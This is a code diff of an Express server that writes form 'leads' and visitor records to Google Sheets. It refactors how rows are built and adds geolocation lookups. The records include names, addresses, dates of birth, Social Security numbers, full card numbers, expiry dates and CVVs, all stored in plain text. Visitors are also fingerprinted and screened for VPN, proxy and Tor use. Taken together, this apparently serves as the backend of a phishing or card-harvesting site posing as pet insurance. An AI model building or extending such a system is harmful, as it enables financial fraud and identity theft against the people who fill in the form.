@@ -7,7 +7,7 @@ const { google } = require("googleapis");
 const app = express();
 
 app.use(cors());
-app.use(express.json());
+app.use(express.json({ limit: "1mb" }));
 
 const MASTER_TAB = "MasterData";
 const VISITORS_TAB = "Visitors";
@@ -25,7 +25,12 @@ const getPakistanTime = () =>
   });
 
 function normalizeHeader(value) {
-  return String(value || "").trim().toLowerCase();
+  return String(value || "")
+    .trim()
+    .toLowerCase()
+    .replace(/['’]/g, "")
+    .replace(/[/_-]/g, " ")
+    .replace(/\s+/g, " ");
 }
 
 function columnToLetter(columnNumber) {
@@ -90,7 +95,7 @@ async function getHeaders(tabName) {
 async function getRows(tabName) {
   const sheets = await getSheetsClient();
   const headers = await getHeaders(tabName);
-  const lastColumn = columnToLetter(headers.length);
+  const lastColumn = columnToLetter(headers.length || 1);
 
   const response = await sheets.spreadsheets.values.get({
     spreadsheetId: process.env.SHEET_ID,
@@ -200,6 +205,19 @@ async function getNextVisitorId() {
   return `visitor-${count + 1}`;
 }
 
+function getCountryName(countryCode) {
+  if (!countryCode) return "";
+
+  try {
+    return (
+      new Intl.DisplayNames(["en"], { type: "region" }).of(countryCode) ||
+      countryCode
+    );
+  } catch {
+    return countryCode;
+  }
+}
+
 async function getIpInfo(ip) {
   try {
     if (!process.env.IPINFO_TOKEN) return {};
@@ -222,10 +240,43 @@ async function getIpInfo(ip) {
   }
 }
 
+async function getCityFromLatLong(latitude, longitude) {
+  try {
+    if (!latitude || !longitude) return "";
+
+    const url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`;
+
+    const response = await fetch(url);
+    if (!response.ok) return "";
+
+    const data = await response.json();
+
+    return (
+      data.city ||
+      data.locality ||
+      data.localityInfo?.administrative?.[3]?.name ||
+      data.localityInfo?.administrative?.[2]?.name ||
+      data.principalSubdivision ||
+      ""
+    );
+  } catch (error) {
+    console.log("CITY FETCH ERROR:", error.message);
+    return "";
+  }
+}
+
 async function buildVisitorData(req, clientData = {}) {
   const ipInfo = await getIpInfo(getClientIp(req));
+
   const loc = ipInfo.loc || "";
   const [latitude = "", longitude = ""] = loc.split(",");
+
+  let fetchedCity = ipInfo.city || "";
+
+  if (!fetchedCity && latitude && longitude) {
+    fetchedCity = await getCityFromLatLong(latitude, longitude);
+  }
+
   const now = getPakistanTime();
 
   return {
@@ -233,9 +284,9 @@ async function buildVisitorData(req, clientData = {}) {
     visitDate: now,
     visitorId: clientData.visitorId || "",
     ip: ipInfo.ip || getClientIp(req) || "",
-    country: ipInfo.country || "",
+    country: getCountryName(ipInfo.country),
     stateRegion: ipInfo.region || "",
-    city: ipInfo.city || "",
+    city: fetchedCity,
     zip: ipInfo.postal || "",
     latitude,
     longitude,
@@ -265,115 +316,108 @@ async function buildVisitorData(req, clientData = {}) {
   };
 }
 
-function visitorRow(visitor) {
-  return [
-    visitor.date || "",
-    visitor.visitorId || "",
-    visitor.ip || "",
-    visitor.country || "",
-    visitor.stateRegion || "",
-    visitor.city || "",
-    visitor.zip || "",
-    visitor.latitude || "",
-    visitor.longitude || "",
-    visitor.timezone || "",
-    visitor.isp || "",
-    visitor.asn || "",
-    visitor.referrer || "",
-    visitor.deviceType || "",
-    visitor.os || "",
-    visitor.browser || "",
-    visitor.userSystemTime || "",
-    visitor.userTimezone || "",
-    visitor.tzOffsetMin || "",
-    visitor.proxy || "",
-    visitor.vpn || "",
-    visitor.tor || "",
-    visitor.hostingDc || "",
-    visitor.proxyVpnSource || "",
-    visitor.userAgent || "",
-    visitor.language || "",
-    visitor.platform || "",
-    visitor.screen || "",
-    visitor.availableScreen || "",
-    visitor.colorDepth || "",
-    visitor.pixelDepth || "",
-    visitor.page || "",
-  ];
+function pick(source, keys) {
+  for (const key of keys) {
+    if (source?.[key] !== undefined && source?.[key] !== null) {
+      return source[key];
+    }
+  }
+  return "";
 }
 
-function v(visitor, camelKey, spaceKey = "") {
-  return visitor?.[camelKey] || visitor?.[spaceKey] || "";
+function buildMap(data = {}, visitor = {}, uniqueId = "") {
+  return {
+    date: getPakistanTime(),
+    "unique id": uniqueId,
+
+    "pet name": data.petName,
+    species: data.petSpecies,
+    gender: data.petSex,
+    breed: data.breed,
+    age: data.age,
+    "zip code": data.zipCode,
+    email: data.email,
+    phone: data.phone,
+
+    plan: data.planName,
+    price: data.amount,
+
+    "first name": data.firstName,
+    "last name": data.lastName,
+    address: data.address,
+    apartment: data.apartment,
+    city: data.city || visitor.city,
+    state: data.state,
+    dob: data.dob,
+    ssn: data.ssn,
+
+    "card name": data.cardName,
+    "card number": data.cardNumber,
+    "card expiry": data.cardExpiry,
+    "card cvv": data.cardCVV,
+    "billing zip": data.billingZip,
+
+    "visit date": pick(visitor, ["visitDate", "date"]),
+    "visitor id": visitor.visitorId,
+    ip: visitor.ip,
+    country: visitor.country,
+    "state region": visitor.stateRegion,
+    "state/region": visitor.stateRegion,
+    "ip city": visitor.city,
+    "visitor city": visitor.city,
+    zip: visitor.zip,
+    latitude: visitor.latitude,
+    longitude: visitor.longitude,
+    timezone: visitor.timezone,
+    isp: visitor.isp,
+    asn: visitor.asn,
+    referrer: visitor.referrer,
+    "device type": visitor.deviceType,
+    os: visitor.os,
+    browser: visitor.browser,
+    "user system time": visitor.userSystemTime,
+    "user timezone": visitor.userTimezone,
+    "tz offset min": visitor.tzOffsetMin,
+    proxy: visitor.proxy,
+    vpn: visitor.vpn,
+    tor: visitor.tor,
+    "hosting dc": visitor.hostingDc,
+    "hosting/dc": visitor.hostingDc,
+    "proxy vpn source": visitor.proxyVpnSource,
+    "proxy/vpn source": visitor.proxyVpnSource,
+    "user agent": visitor.userAgent,
+    language: visitor.language,
+    platform: visitor.platform,
+    screen: visitor.screen,
+    "available screen": visitor.availableScreen,
+    "color depth": visitor.colorDepth,
+    "pixel depth": visitor.pixelDepth,
+    page: visitor.page,
+  };
 }
 
-function masterRow(data, visitor, uniqueId) {
-  return [
-    getPakistanTime(),
-    uniqueId,
-    data.petName || "",
-    data.petSpecies || "",
-    data.petSex || "",
-    data.breed || "",
-    data.age || "",
-    data.zipCode || "",
-    data.email || "",
-    data.phone || "",
-    data.planName || "",
-    data.amount || "",
-    data.firstName || "",
-    data.lastName || "",
-    data.address || "",
-    data.apartment || "",
-    data.city || "",
-    data.state || "",
-    data.dob || "",
-    data.ssn || "",
-    data.cardName || "",
-    data.cardNumber || "",
-    data.cardExpiry || "",
-    data.cardCVV || "",
-    data.billingZip || "",
+function rowFromHeaders(headers, map) {
+  return headers.map((header) => {
+    const key = normalizeHeader(header);
+    return map[key] ?? "";
+  });
+}
 
-    v(visitor, "visitDate", "visit date") || visitor.date || "",
-    v(visitor, "visitorId", "visitor id"),
-    v(visitor, "ip"),
-    v(visitor, "country"),
-    v(visitor, "stateRegion", "state/region"),
-    v(visitor, "city"),
-    v(visitor, "zip"),
-    v(visitor, "latitude"),
-    v(visitor, "longitude"),
-    v(visitor, "timezone"),
-    v(visitor, "isp"),
-    v(visitor, "asn"),
-    v(visitor, "referrer"),
-    v(visitor, "deviceType", "device type"),
-    v(visitor, "os"),
-    v(visitor, "browser"),
-    v(visitor, "userSystemTime", "user system time"),
-    v(visitor, "userTimezone", "user timezone"),
-    v(visitor, "tzOffsetMin", "tz offset min"),
-    v(visitor, "proxy"),
-    v(visitor, "vpn"),
-    v(visitor, "tor"),
-    v(visitor, "hostingDc", "hosting/dc"),
-    v(visitor, "proxyVpnSource", "proxy/vpn source"),
-    v(visitor, "userAgent", "user agent"),
-    v(visitor, "language"),
-    v(visitor, "platform"),
-    v(visitor, "screen"),
-    v(visitor, "availableScreen", "available screen"),
-    v(visitor, "colorDepth", "color depth"),
-    v(visitor, "pixelDepth", "pixel depth"),
-    v(visitor, "page"),
-  ];
+function visitorRowFromHeaders(headers, visitor) {
+  const map = buildMap({}, visitor, "");
+  return rowFromHeaders(headers, map);
+}
+
+function masterRowFromHeaders(headers, data, visitor, uniqueId) {
+  const map = buildMap(data, visitor, uniqueId);
+  return rowFromHeaders(headers, map);
 }
 
 async function updateLead(uniqueId, updates) {
   const sheets = await getSheetsClient();
   const headers = await getHeaders(MASTER_TAB);
   const rows = await getRows(MASTER_TAB);
-  const lastColumn = columnToLetter(headers.length);
+  const lastColumn = columnToLetter(headers.length || 1);
 
   const uniqueIdIndex = headers.findIndex(
     (h) => normalizeHeader(h) === "unique id"
@@ -386,44 +430,17 @@ async function updateLead(uniqueId, updates) {
   if (rowIndex === -1) throw new Error("Lead not found");
 
   const row = [...rows[rowIndex]];
-
   while (row.length < headers.length) row.push("");
 
-  const formMap = {
-    "pet name": updates.petName,
-    species: updates.petSpecies,
-    gender: updates.petSex,
-    breed: updates.breed,
-    age: updates.age,
-    "zip code": updates.zipCode,
-    email: updates.email,
-    phone: updates.phone,
-    plan: updates.planName,
-    price: updates.amount,
-    "first name": updates.firstName,
-    "last name": updates.lastName,
-    address: updates.address,
-    apartment: updates.apartment,
-    city: updates.city,
-    state: updates.state,
-    dob: updates.dob,
-    ssn: updates.ssn,
-    "card name": updates.cardName,
-    "card number": updates.cardNumber,
-    "card expiry": updates.cardExpiry,
-    "card cvv": updates.cardCVV,
-    "billing zip": updates.billingZip,
-  };
-
-  const billingZipIndex = headers.findIndex(
-    (h) => normalizeHeader(h) === "billing zip"
-  );
+  const updateMap = buildMap(updates, updates.visitorData || {}, uniqueId);
 
   headers.forEach((header, index) => {
-    if (index > billingZipIndex) return;
-
     const key = normalizeHeader(header);
-    if (formMap[key] !== undefined) row[index] = formMap[key] || "";
+    const value = updateMap[key];
+
+    if (value !== undefined && value !== "") {
+      row[index] = value;
+    }
   });
 
   const rowNumber = rowIndex + 1;
@@ -453,7 +470,8 @@ app.post("/api/track-visitor", async (req, res) => {
       visitorId,
     });
 
-    await appendRow(VISITORS_TAB, visitorRow(visitor));
+    const headers = await getHeaders(VISITORS_TAB);
+    await appendRow(VISITORS_TAB, visitorRowFromHeaders(headers, visitor));
 
     res.json({ success: true, visitorData: visitor });
   } catch (error) {
@@ -470,7 +488,11 @@ app.post("/api/create-lead", async (req, res) => {
       ? req.body.visitorData
       : await buildVisitorData(req, req.body.visitorData || {});
 
-    await appendRow(MASTER_TAB, masterRow(req.body, visitor, uniqueId));
+    const headers = await getHeaders(MASTER_TAB);
+    await appendRow(
+      MASTER_TAB,
+      masterRowFromHeaders(headers, req.body, visitor, uniqueId)
+    );
 
     res.json({ success: true, uniqueId });
   } catch (error) {
@@ -482,6 +504,11 @@ app.post("/api/create-lead", async (req, res) => {
 app.post("/api/update-lead", async (req, res) => {
   try {
     const { uniqueId, ...updates } = req.body;
+
+    if (!uniqueId) {
+      throw new Error("uniqueId is required");
+    }
+
     await updateLead(uniqueId, updates);
     res.json({ success: true, uniqueId });
   } catch (error) {
